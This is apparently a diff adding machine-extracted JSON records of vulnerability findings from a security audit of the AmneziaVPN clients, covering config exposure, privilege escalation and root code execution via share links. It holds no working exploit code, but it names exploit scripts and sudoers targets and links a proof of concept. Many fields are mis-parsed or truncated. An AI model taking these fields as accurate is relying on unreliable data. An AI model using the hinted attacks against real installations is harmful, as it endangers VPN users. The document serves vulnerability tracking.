+        "evidence": "Finding IDs: AVP-01-005 | Assets: files\\.config\\AmneziaVPN.ORG\\AmneziaVPN.conf 33 https://developer.android.com/topic/security/data 32 https://www.cvedetails.com/vulnerability-list.php?vendor_id=1224&product_id=19997 | Services: HTTPS | URLs: https://developer.android.com/topic/security/data, https://www.cvedetails.com/vulnerability-list.php?vendor_id=1224&product_id=19997, https://developer.android.com/training/articles/keystore, https://github.com/amnezia-vpn/desktop-client/pull/99, https://github.com/amnezia-vpn/desktop-client/pull/97, https://bencoding.com/2017/02/20/swift-excluding-files-from-icloud-backup/, https://developer.apple.com/library/...#//apple_ref/doc/uid/TP40010672-CH2-SW28, https://www.zetetic.net/sqlcipher/, https://developer.android.com/guide/topics/data/autobackup, https://developer.android.com/guide/topics/manifest/application-element#fullBackupContent | Domains: developer.android.com, www.cvedetails.com, github.com, bencoding.com, developer.apple.com, www.zetetic.net, AmneziaVPN.ORG, AmneziaVPN.conf, vulnerability-list.php | IPs: 5.45.92.15 | File paths: AmneziaVPN.conf, www.cvedetails.com/vulnerability-list.php | File names: AmneziaVPN.conf, vulnerability-list.php | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "remediation": "leverage the options provided by the platform to store application",
+        "references": [
+          "https://developer.android.com/topic/security/data",
+          "https://www.cvedetails.com/vulnerability-list.php?vendor_id=1224&product_id=19997",
+          "https://developer.android.com/training/articles/keystore",
+          "https://github.com/amnezia-vpn/desktop-client/pull/99",
+          "https://github.com/amnezia-vpn/desktop-client/pull/97",
+          "https://bencoding.com/2017/02/20/swift-excluding-files-from-icloud-backup/",
+          "https://developer.apple.com/library/...#//apple_ref/doc/uid/TP40010672-CH2-SW28",
+          "https://www.zetetic.net/sqlcipher/",
+          "https://developer.android.com/guide/topics/data/autobackup",
+          "https://developer.android.com/guide/topics/manifest/application-element#fullBackupContent",
+          "developer.android.com",
+          "www.cvedetails.com",
+          "github.com",
+          "bencoding.com",
+          "developer.apple.com",
+          "www.zetetic.net",
+          "AmneziaVPN.ORG",
+          "AmneziaVPN.conf",
+          "vulnerability-list.php",
+          "5.45.92.15"
+        ]
+      },
+      "normalization": {
+        "normalizedTitle": "config access via incorrect android keystore usage",
+        "normalizedAsset": "files\\.config\\amneziavpn.org\\amneziavpn.conf 33 https://developer.android.com/topic/security/data 32 https://www.cvedetails.com/vulnerability-list.php?vendor_id=1224&product_id=19997",
+        "canonicalKey": "AVP-01-005|config access via incorrect android keystore usage|files config amneziavpn org amneziavpn conf 33 https developer android com topic security data 32 https www cvedetails com vulnerability list php vendor id 1224 product id 19997||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Config Access via incorrect Android Keystore Usage",
+        "sourceText": "AVP-01-005 WP1: Config Access via incorrect Android Keystore Usage (Medium) 15",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "reported",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "reported"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Config Access via incorrect Android Keystore Usage",
+      "canonicalKey": "AVP-01-005|config access via incorrect android keystore usage|files config amneziavpn org amneziavpn conf 33 https developer android com topic security data 32 https www cvedetails com vulnerability list php vendor id 1224 product id 19997||||||"
+    },
+    {
+      "id": "F-7asecurity-006",
+      "slug": "linux-vpn-config-access-via-insecure-permissions-home-stamparm-config-amneziavpn-org",
+      "reportId": "G-7asecurity-amneziavpn",
+      "reportName": "7asecurity-amneziavpn",
+      "title": "Linux VPN Config Access via Insecure Permissions",
+      "cve": "—",
+      "severity": "High",
+      "asset": "/home/stamparm/.config/AmneziaVPN.ORG",
+      "score": 84,
+      "status": "Open",
+      "detectedAt": "2026-06-05T23:29:04.354Z",
+      "summary": "Linux VPN Config Access via Insecure Permissions affecting /home/stamparm/.config/AmneziaVPN.ORG; extractor found security indicators from the submitted report. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "impact": "Potential impact includes exploitation, unauthorized access, data exposure, or service compromise against /home/stamparm/.config/AmneziaVPN.ORG if this issue remains unaddressed.",
+      "evidence": "Finding IDs: AVP-01-006 | Assets: /home/stamparm/.config/AmneziaVPN.ORG | Services: HTTPS, SSH | URLs: https://github.com/amnezia-vpn/desktop-client/commit/cdb1a4c288e86c5cef31, https://developer.android.com/training/articles/keystore, https://developer.android.com/topic/security/data | Domains: github.com, developer.android.com, AmneziaVPN.ORG, AmneziaVPN.conf | File paths: /home/stamparm/.config/AmneziaVPN.ORG, AmneziaVPN.conf | File names: AmneziaVPN.conf | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "remediation": "implement the minimum possible permissions on all configuration",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:29:13.496Z",
+          "status": "Open",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Profile-bounded extraction used to keep this report family stable for regression and training"
+        }
+      ],
+      "reported": {
+        "title": "Linux VPN Config Access via Insecure Permissions",
+        "severity": "High",
+        "asset": "/home/stamparm/.config/AmneziaVPN.ORG",
+        "status": "Open",
+        "summary": "Linux VPN Config Access via Insecure Permissions affecting /home/stamparm/.config/AmneziaVPN.ORG; extractor found security indicators from the submitted report. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "impact": "Potential impact includes exploitation, unauthorized access, data exposure, or service compromise against /home/stamparm/.config/AmneziaVPN.ORG if this issue remains unaddressed.",
+        "evidence": "Finding IDs: AVP-01-006 | Assets: /home/stamparm/.config/AmneziaVPN.ORG | Services: HTTPS, SSH | URLs: https://github.com/amnezia-vpn/desktop-client/commit/cdb1a4c288e86c5cef31, https://developer.android.com/training/articles/keystore, https://developer.android.com/topic/security/data | Domains: github.com, developer.android.com, AmneziaVPN.ORG, AmneziaVPN.conf | File paths: /home/stamparm/.config/AmneziaVPN.ORG, AmneziaVPN.conf | File names: AmneziaVPN.conf | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "remediation": "implement the minimum possible permissions on all configuration",
+        "references": [
+          "https://github.com/amnezia-vpn/desktop-client/commit/cdb1a4c288e86c5cef31",
+          "https://developer.android.com/training/articles/keystore",
+          "https://developer.android.com/topic/security/data",
+          "github.com",
+          "developer.android.com",
+          "AmneziaVPN.ORG",
+          "AmneziaVPN.conf"
+        ]
+      },
+      "normalization": {
+        "normalizedTitle": "linux vpn config access via insecure permissions",
+        "normalizedAsset": "/home/stamparm/.config/amneziavpn.org",
+        "canonicalKey": "AVP-01-006|linux vpn config access via insecure permissions|home stamparm config amneziavpn org||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Linux VPN Config Access via Insecure Permissions",
+        "sourceText": "AVP-01-006 WP2: Linux VPN Config Access via Insecure Permissions (High) 16",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "reported",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "reported"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Linux VPN Config Access via Insecure Permissions",
+      "canonicalKey": "AVP-01-006|linux vpn config access via insecure permissions|home stamparm config amneziavpn org||||||"
+    },
+    {
+      "id": "F-7asecurity-007",
+      "slug": "linux-mac-win-dos-via-predictable-port-usage-tmp-amneziavpn-dyxrpl",
+      "reportId": "G-7asecurity-amneziavpn",
+      "reportName": "7asecurity-amneziavpn",
+      "title": "Linux/Mac/Win DoS via Predictable Port Usage",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "/tmp/AmneziaVPN.DYXRpl",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:29:04.354Z",
+      "summary": "Linux/Mac/Win DoS via Predictable Port Usage affecting /tmp/AmneziaVPN.DYXRpl; extractor found type Denial of Service. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "impact": "Potential impact includes increased attacker opportunity against /tmp/AmneziaVPN.DYXRpl if this signal is not reviewed.",
+      "evidence": "Finding IDs: AVP-01-010 | Assets: /tmp/AmneziaVPN.DYXRpl | Services: HTTPS, SSH | URLs: https://github.com/amnezia-vpn/desktop-client/pull/101, https://www.frankindev.com/2020/11/26/permissions-for-.ssh-folder-and-key-files/ | Domains: github.com, www.frankindev.com, AmneziaVPN.DYXRpl | IPs: 127.0.0.1, 1.1.1.1, 1.0.0.1, 2.0.8.0 | File paths: /tmp/AmneziaVPN.DYXRpl | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "remediation": "replace the fixed port with a randomly chosen one",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:29:13.497Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Profile-bounded extraction used to keep this report family stable for regression and training"
+        }
+      ],
+      "reported": {
+        "title": "Linux/Mac/Win DoS via Predictable Port Usage",
+        "severity": "Medium",
+        "asset": "/tmp/AmneziaVPN.DYXRpl",
+        "status": "In Review",
+        "summary": "Linux/Mac/Win DoS via Predictable Port Usage affecting /tmp/AmneziaVPN.DYXRpl; extractor found type Denial of Service. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "impact": "Potential impact includes increased attacker opportunity against /tmp/AmneziaVPN.DYXRpl if this signal is not reviewed.",
+        "evidence": "Finding IDs: AVP-01-010 | Assets: /tmp/AmneziaVPN.DYXRpl | Services: HTTPS, SSH | URLs: https://github.com/amnezia-vpn/desktop-client/pull/101, https://www.frankindev.com/2020/11/26/permissions-for-.ssh-folder-and-key-files/ | Domains: github.com, www.frankindev.com, AmneziaVPN.DYXRpl | IPs: 127.0.0.1, 1.1.1.1, 1.0.0.1, 2.0.8.0 | File paths: /tmp/AmneziaVPN.DYXRpl | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "remediation": "replace the fixed port with a randomly chosen one",
+        "references": [
+          "https://github.com/amnezia-vpn/desktop-client/pull/101",
+          "https://www.frankindev.com/2020/11/26/permissions-for-.ssh-folder-and-key-files/",
+          "github.com",
+          "www.frankindev.com",
+          "AmneziaVPN.DYXRpl",
+          "127.0.0.1",
+          "1.1.1.1",
+          "1.0.0.1",
+          "2.0.8.0"
+        ]
+      },
+      "normalization": {
+        "normalizedTitle": "linux/mac/win dos via predictable port usage",
+        "normalizedAsset": "/tmp/amneziavpn.dyxrpl",
+        "canonicalKey": "AVP-01-010|linux mac win dos via predictable port usage|tmp amneziavpn dyxrpl||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Linux/Mac/Win DoS via Predictable Port Usage",
+        "sourceText": "AVP-01-010 WP2: Linux/Mac/Win DoS via Predictable Port Usage (Medium) 17",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "reported",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "reported"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Linux/Mac/Win DoS via Predictable Port Usage",
+      "canonicalKey": "AVP-01-010|linux mac win dos via predictable port usage|tmp amneziavpn dyxrpl||||||"
+    },
+    {
+      "id": "F-7asecurity-008",
+      "slug": "linux-mac-win-privesc-via-ipc-design-flaw-client-protocols-openvpnprotocol-cpp-client-protocols-wire",
+      "reportId": "G-7asecurity-amneziavpn",
+      "reportName": "7asecurity-amneziavpn",
+      "title": "Linux/Mac/Win PrivEsc via IPC Design Flaw",
+      "cve": "—",
+      "severity": "Critical",
+      "asset": "client/protocols/openvpnprotocol.cpp client/protocols/wireguardprotocol.cpp client/protocols/ikev2_vpn_protocol_windows.cpp",
+      "score": 94,
+      "status": "Open",
+      "detectedAt": "2026-06-05T23:29:04.354Z",
+      "summary": "Linux/Mac/Win PrivEsc via IPC Design Flaw affecting client/protocols/openvpnprotocol.cpp client/protocols/wireguardprotocol.cpp client/protocols/ikev2_vpn_protocol_windows.cpp; extractor found type Privilege Escalation. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "impact": "Potential impact includes exploitation, unauthorized access, data exposure, or service compromise against client/protocols/openvpnprotocol.cpp client/protocols/wireguardprotocol.cpp client/protocols/ikev2_vpn_protocol_windows.cpp if this issue remains unaddressed.",
+      "evidence": "Finding IDs: AVP-01-011 | Assets: client/protocols/openvpnprotocol.cpp client/protocols/wireguardprotocol.cpp client/protocols/ikev2_vpn_protocol_windows.cpp | Services: HTTPS | URLs: https://github.com/amnezia-vpn/desktop-client/pull/94 | Domains: github.com, AmneziaVPN.CxTOjh, socket.socket, sock.connect, sock.send, binascii.unhexlify, sock.recv, time.sleep, glob.glob, os.path.getctime, os.getlogin, os.chmod, os.system, exploit.py, openvpnprotocol.cpp, wireguardprotocol.cpp | IPs: 127.0.0.1 | File paths: /usr/sbin/openvpn, /tmp/AmneziaVPN.CxTOjh, /etc/sudoers, exploit.py, client/protocols/openvpnprotocol.cpp, client/protocols/wireguardprotocol.cpp, client/protocols/ikev2_vpn_protocol_windows.cpp | File names: sudo_pliz.sh, exploit.py | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "remediation": "avoid passing the VPN program command line arguments from",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:29:13.498Z",
+          "status": "Open",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Profile-bounded extraction used to keep this report family stable for regression and training"
+        }
+      ],
+      "reported": {
+        "title": "Linux/Mac/Win PrivEsc via IPC Design Flaw",
+        "severity": "Critical",
+        "asset": "client/protocols/openvpnprotocol.cpp client/protocols/wireguardprotocol.cpp client/protocols/ikev2_vpn_protocol_windows.cpp",
+        "status": "Open",
+        "summary": "Linux/Mac/Win PrivEsc via IPC Design Flaw affecting client/protocols/openvpnprotocol.cpp client/protocols/wireguardprotocol.cpp client/protocols/ikev2_vpn_protocol_windows.cpp; extractor found type Privilege Escalation. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "impact": "Potential impact includes exploitation, unauthorized access, data exposure, or service compromise against client/protocols/openvpnprotocol.cpp client/protocols/wireguardprotocol.cpp client/protocols/ikev2_vpn_protocol_windows.cpp if this issue remains unaddressed.",
+        "evidence": "Finding IDs: AVP-01-011 | Assets: client/protocols/openvpnprotocol.cpp client/protocols/wireguardprotocol.cpp client/protocols/ikev2_vpn_protocol_windows.cpp | Services: HTTPS | URLs: https://github.com/amnezia-vpn/desktop-client/pull/94 | Domains: github.com, AmneziaVPN.CxTOjh, socket.socket, sock.connect, sock.send, binascii.unhexlify, sock.recv, time.sleep, glob.glob, os.path.getctime, os.getlogin, os.chmod, os.system, exploit.py, openvpnprotocol.cpp, wireguardprotocol.cpp | IPs: 127.0.0.1 | File paths: /usr/sbin/openvpn, /tmp/AmneziaVPN.CxTOjh, /etc/sudoers, exploit.py, client/protocols/openvpnprotocol.cpp, client/protocols/wireguardprotocol.cpp, client/protocols/ikev2_vpn_protocol_windows.cpp | File names: sudo_pliz.sh, exploit.py | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "remediation": "avoid passing the VPN program command line arguments from",
+        "references": [
+          "https://github.com/amnezia-vpn/desktop-client/pull/94",
+          "github.com",
+          "AmneziaVPN.CxTOjh",
+          "socket.socket",
+          "sock.connect",
+          "sock.send",
+          "binascii.unhexlify",
+          "sock.recv",
+          "time.sleep",
+          "glob.glob",
+          "os.path.getctime",
+          "os.getlogin",
+          "os.chmod",
+          "os.system",
+          "exploit.py",
+          "openvpnprotocol.cpp",
+          "wireguardprotocol.cpp",
+          "127.0.0.1"
+        ]
+      },
+      "normalization": {
+        "normalizedTitle": "linux/mac/win privesc via ipc design flaw",
+        "normalizedAsset": "client/protocols/openvpnprotocol.cpp client/protocols/wireguardprotocol.cpp client/protocols/ikev2_vpn_protocol_windows.cpp",
+        "canonicalKey": "AVP-01-011|linux mac win privesc via ipc design flaw|client protocols openvpnprotocol cpp client protocols wireguardprotocol cpp client protocols ikev2 vpn protocol windows cpp||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Linux/Mac/Win PrivEsc via IPC Design Flaw",
+        "sourceText": "AVP-01-011 WP2: Linux/Mac/Win PrivEsc via IPC Design Flaw (Critical) 19",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "reported",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "reported"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Linux/Mac/Win PrivEsc via IPC Design Flaw",
+      "canonicalKey": "AVP-01-011|linux mac win privesc via ipc design flaw|client protocols openvpnprotocol cpp client protocols wireguardprotocol cpp client protocols ikev2 vpn protocol windows cpp||||||"
+    },
+    {
+      "id": "F-7asecurity-009",
+      "slug": "linux-mac-win-rce-as-root-via-malicious-share-link-client-ui-pages-logic-startpagelogic-cpp",
+      "reportId": "G-7asecurity-amneziavpn",
+      "reportName": "7asecurity-amneziavpn",
+      "title": "Linux/Mac/Win RCE as root via Malicious Share Link",
+      "cve": "—",
+      "severity": "Critical",
+      "asset": "client/ui/pages_logic/StartPageLogic.cpp",
+      "score": 94,
+      "status": "Open",
+      "detectedAt": "2026-06-05T23:29:04.354Z",
+      "summary": "Linux/Mac/Win RCE as root via Malicious Share Link affecting client/ui/pages_logic/StartPageLogic.cpp; extractor found type Remote Code Execution. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "impact": "Potential impact includes exploitation, unauthorized access, data exposure, or service compromise against client/ui/pages_logic/StartPageLogic.cpp if this issue remains unaddressed.",
+      "evidence": "Finding IDs: AVP-01-014 | Assets: client/ui/pages_logic/StartPageLogic.cpp | Services: HTTPS | URLs: https://7as.es/AmneziaVPN_uEuw9k6N/vpn_share_link_poc.txt, https://doc.qt.io/qt-6/qbytearray.html#qCompress, https://github.com/amnezia-vpn/desktop-client/pull/100 | Domains: 7as.es, doc.qt.io, github.com, qbytearray.html, StartPageLogic.cpp, code.replace, code.toUtf8, o.isEmpty, credentials.hostName, profile.value, credentials.port, credentials.userName, credentials.password, credentials.isValid, profile.contains | IPs: 23.254.203.53, 109.227.28.102 | File paths: /bin/bash, client/ui/pages_logic/StartPageLogic.cpp | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "remediation": "filter the parsed Shared Server",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:29:13.499Z",
+          "status": "Open",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Profile-bounded extraction used to keep this report family stable for regression and training"
+        }
+      ],
+      "reported": {
+        "title": "Linux/Mac/Win RCE as root via Malicious Share Link",
+        "severity": "Critical",
+        "asset": "client/ui/pages_logic/StartPageLogic.cpp",
+        "status": "Open",
+        "summary": "Linux/Mac/Win RCE as root via Malicious Share Link affecting client/ui/pages_logic/StartPageLogic.cpp; extractor found type Remote Code Execution. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "impact": "Potential impact includes exploitation, unauthorized access, data exposure, or service compromise against client/ui/pages_logic/StartPageLogic.cpp if this issue remains unaddressed.",
+        "evidence": "Finding IDs: AVP-01-014 | Assets: client/ui/pages_logic/StartPageLogic.cpp | Services: HTTPS | URLs: https://7as.es/AmneziaVPN_uEuw9k6N/vpn_share_link_poc.txt, https://doc.qt.io/qt-6/qbytearray.html#qCompress, https://github.com/amnezia-vpn/desktop-client/pull/100 | Domains: 7as.es, doc.qt.io, github.com, qbytearray.html, StartPageLogic.cpp, code.replace, code.toUtf8, o.isEmpty, credentials.hostName, profile.value, credentials.port, credentials.userName, credentials.password, credentials.isValid, profile.contains | IPs: 23.254.203.53, 109.227.28.102 | File paths: /bin/bash, client/ui/pages_logic/StartPageLogic.cpp | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "remediation": "filter the parsed Shared Server",
+        "references": [
+          "https://7as.es/AmneziaVPN_uEuw9k6N/vpn_share_link_poc.txt",
+          "https://doc.qt.io/qt-6/qbytearray.html#qCompress",
+          "https://github.com/amnezia-vpn/desktop-client/pull/100",
+          "7as.es",
+          "doc.qt.io",
+          "github.com",
+          "qbytearray.html",
+          "StartPageLogic.cpp",
+          "code.replace",
+          "code.toUtf8",
+          "o.isEmpty",
+          "credentials.hostName",
+          "profile.value",
+          "credentials.port",
+          "credentials.userName",
+          "credentials.password",
+          "credentials.isValid",
+          "profile.contains",
+          "23.254.203.53",
+          "109.227.28.102"
+        ]
+      },
+      "normalization": {
+        "normalizedTitle": "linux/mac/win rce as root via malicious share link",
+        "normalizedAsset": "client/ui/pages_logic/startpagelogic.cpp",
+        "canonicalKey": "AVP-01-014|linux mac win rce as root via malicious share link|client ui pages logic startpagelogic cpp||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Linux/Mac/Win RCE as root via Malicious Share Link",
+        "sourceText": "AVP-01-014 WP2: Linux/Mac/Win RCE as root via Malicious Share Link (Critical) 22",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "reported",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "reported"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Linux/Mac/Win RCE as root via Malicious Share Link",
+      "canonicalKey": "AVP-01-014|linux mac win rce as root via malicious share link|client ui pages logic startpagelogic cpp||||||"
+    },
+    {
+      "id": "F-7asecurity-010",
+      "slug": "config-access-via-missing-ios-keychain-usage-var-mobile-containers-data-application-library-preferen",
+      "reportId": "G-7asecurity-amneziavpn",
+      "reportName": "7asecurity-amneziavpn",
+      "title": "Config Access via missing iOS KeyChain usage",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "/var/mobile/Containers/Data/Application/[...]/Library/Preferences/org.amneziavpn.Amnezi aVPN.plist",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:29:04.354Z",
+      "summary": "Config Access via missing iOS KeyChain usage affecting /var/mobile/Containers/Data/Application/[...]/Library/Preferences/org.amneziavpn.Amnezi aVPN.plist; extractor found security indicators from the submitted report. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "impact": "Potential impact includes increased attacker opportunity against /var/mobile/Containers/Data/Application/[...]/Library/Preferences/org.amneziavpn.Amnezi aVPN.plist if this signal is not reviewed.",
+      "evidence": "Finding IDs: AVP-01-015 | Assets: /var/mobile/Containers/Data/Application/[...]/Library/Preferences/org.amneziavpn.Amnezi aVPN.plist | Services: HTTPS | URLs: https://github.com/amnezia-vpn/desktop-client/pull/99, https://github.com/amnezia-vpn/desktop-client/pull/97, https://developer.apple.com/documentation/security/ksecattraccessiblewhenunlocked, https://developer.apple.com/documentation/security/ksecattraccessiblewhenunlockedthisdeviceonly, https://developer.apple.com/.../accessing_keychain_items_with_face_id_or_touch_id, https://developer.apple.com/documentation/security/ksecattraccessiblewhenpasscodesetthisdeviceonly | Domains: github.com, developer.apple.com, org.amneziavpn.Amnezi, aVPN.plist | IPs: 5.45.92.15 | File paths: /var/mobile/Containers/Data/Application/ | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "remediation": "use a more restricted level of access",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:29:13.501Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Profile-bounded extraction used to keep this report family stable for regression and training"
+        }
+      ],
+      "reported": {
+        "title": "Config Access via missing iOS KeyChain usage",
+        "severity": "Medium",
+        "asset": "/var/mobile/Containers/Data/Application/[...]/Library/Preferences/org.amneziavpn.Amnezi aVPN.plist",
+        "status": "In Review",
+        "summary": "Config Access via missing iOS KeyChain usage affecting /var/mobile/Containers/Data/Application/[...]/Library/Preferences/org.amneziavpn.Amnezi aVPN.plist; extractor found security indicators from the submitted report. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "impact": "Potential impact includes increased attacker opportunity against /var/mobile/Containers/Data/Application/[...]/Library/Preferences/org.amneziavpn.Amnezi aVPN.plist if this signal is not reviewed.",
+        "evidence": "Finding IDs: AVP-01-015 | Assets: /var/mobile/Containers/Data/Application/[...]/Library/Preferences/org.amneziavpn.Amnezi aVPN.plist | Services: HTTPS | URLs: https://github.com/amnezia-vpn/desktop-client/pull/99, https://github.com/amnezia-vpn/desktop-client/pull/97, https://developer.apple.com/documentation/security/ksecattraccessiblewhenunlocked, https://developer.apple.com/documentation/security/ksecattraccessiblewhenunlockedthisdeviceonly, https://developer.apple.com/.../accessing_keychain_items_with_face_id_or_touch_id, https://developer.apple.com/documentation/security/ksecattraccessiblewhenpasscodesetthisdeviceonly | Domains: github.com, developer.apple.com, org.amneziavpn.Amnezi, aVPN.plist | IPs: 5.45.92.15 | File paths: /var/mobile/Containers/Data/Application/ | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "remediation": "use a more restricted level of access",
+        "references": [
+          "https://github.com/amnezia-vpn/desktop-client/pull/99",
+          "https://github.com/amnezia-vpn/desktop-client/pull/97",
+          "https://developer.apple.com/documentation/security/ksecattraccessiblewhenunlocked",
+          "https://developer.apple.com/documentation/security/ksecattraccessiblewhenunlockedthisdeviceonly",
+          "https://developer.apple.com/.../accessing_keychain_items_with_face_id_or_touch_id",
+          "https://developer.apple.com/documentation/security/ksecattraccessiblewhenpasscodesetthisdeviceonly",
+          "github.com",
+          "developer.apple.com",
+          "org.amneziavpn.Amnezi",
+          "aVPN.plist",
+          "5.45.92.15"
+        ]
+      },
+      "normalization": {
+        "normalizedTitle": "config access via missing ios keychain usage",
+        "normalizedAsset": "/var/mobile/containers/data/application/[...]/library/preferences/org.amneziavpn.amnezi avpn.plist",
+        "canonicalKey": "AVP-01-015|config access via missing ios keychain usage|var mobile containers data application library preferences org amneziavpn amnezi avpn plist||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Config Access via missing iOS KeyChain usage",
+        "sourceText": "AVP-01-015 WP1: Config Access via missing iOS KeyChain usage (Medium) 25",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "reported",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "reported"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Config Access via missing iOS KeyChain usage",
+      "canonicalKey": "AVP-01-015|config access via missing ios keychain usage|var mobile containers data application library preferences org amneziavpn amnezi avpn plist||||||"
+    },
+    {
+      "id": "F-7asecurity-011",
+      "slug": "config-access-via-missing-ios-data-protection-library-preferences-org-amneziavpn-amneziavpn-plist",
+      "reportId": "G-7asecurity-amneziavpn",
+      "reportName": "7asecurity-amneziavpn",
+      "title": "Config Access via missing iOS Data Protection",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "Library/Preferences/org.amneziavpn.AmneziaVPN.plist",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:29:04.354Z",
+      "summary": "Config Access via missing iOS Data Protection affecting Library/Preferences/org.amneziavpn.AmneziaVPN.plist; extractor found type Information Disclosure. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "impact": "Potential impact includes increased attacker opportunity against Library/Preferences/org.amneziavpn.AmneziaVPN.plist if this signal is not reviewed.",
+      "evidence": "Finding IDs: AVP-01-016 | Assets: Library/Preferences/org.amneziavpn.AmneziaVPN.plist | Services: HTTPS | URLs: https://developer.apple.com/.../nsfileprotectioncompleteuntilfirstuserauthentication, https://github.com/amnezia-vpn/desktop-client/pull/99, https://github.com/amnezia-vpn/desktop-client/pull/97, https://developer.apple.com/documentation/security/ksecattraccessibleafterfirstunlockthisdeviceonly, https://www.zetetic.net/sqlcipher/ios-tutorial/, https://stackoverflow.com/questions/27933387/nsurlcache-and-data-protection, https://developer.apple.com/documentation/foundation/nsfileprotectioncomplete, https://developer.apple.com/documentation/.../com_apple_developer_default-data-protection | Domains: developer.apple.com, github.com, www.zetetic.net, stackoverflow.com, org.amneziavpn.AmneziaVPN.plist, tar.gz, configuration.requestCachePolicy, URLCache.shared.removeAllCachedResponses | IPs: 5.45.92.15 | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "remediation": "add the Data Protection capability at the application level53",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:29:13.502Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Profile-bounded extraction used to keep this report family stable for regression and training"
+        }
+      ],
+      "reported": {
+        "title": "Config Access via missing iOS Data Protection",
+        "severity": "Medium",
+        "asset": "Library/Preferences/org.amneziavpn.AmneziaVPN.plist",
+        "status": "In Review",
+        "summary": "Config Access via missing iOS Data Protection affecting Library/Preferences/org.amneziavpn.AmneziaVPN.plist; extractor found type Information Disclosure. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
